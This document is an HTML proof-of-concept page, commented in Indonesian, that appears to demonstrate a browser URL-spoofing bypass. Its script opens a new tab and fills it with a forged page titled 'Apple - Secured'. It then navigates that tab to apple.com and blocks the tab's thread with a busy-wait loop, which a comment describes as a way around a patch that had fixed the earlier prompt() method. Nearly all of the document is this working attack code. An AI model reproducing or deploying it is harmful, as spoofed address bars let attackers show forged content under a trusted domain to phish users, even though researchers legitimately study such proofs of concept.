<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Alternative Bypass Test PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      button {
        padding: 20px 40px;
        font-size: 20px;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <button id="startBtn">TEST HEAVYS BLOCKING</button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.remove();

        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Apple - Secured</title></head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
              <div>
                <h1 style="font-size:42px;color:#1d1d1f;">STRESS TEST VIEWPORT</h1>
                <p style="font-size:18px;color:#86868b;">Menguji respons pipeline navigasi di bawah tekanan CPU sinkron.</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // Pemicu navigasi asinkron ke domain target
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com:9090";
            } catch (e) {
              console.error(e);
            }
          }, 2);

          // Membekukan thread utama menggunakan beban komputasi berat (Synchronous Busy-Wait) 
          // sebagai pengganti fungsi prompt() yang sudah ditambal oleh patch IsVisible().
          setTimeout(() => {
            try {
              const start = Date.now();
              // Memblokir thread selama beberapa detik secara kontinu
              while (Date.now() - start < 400) {
                newTab.Math.random(); 
              }
            } catch (e) {
              console.error("Execution blocked:", e);
            }
          }, 50);
        }
      };
    </script>
  </body>
</html>
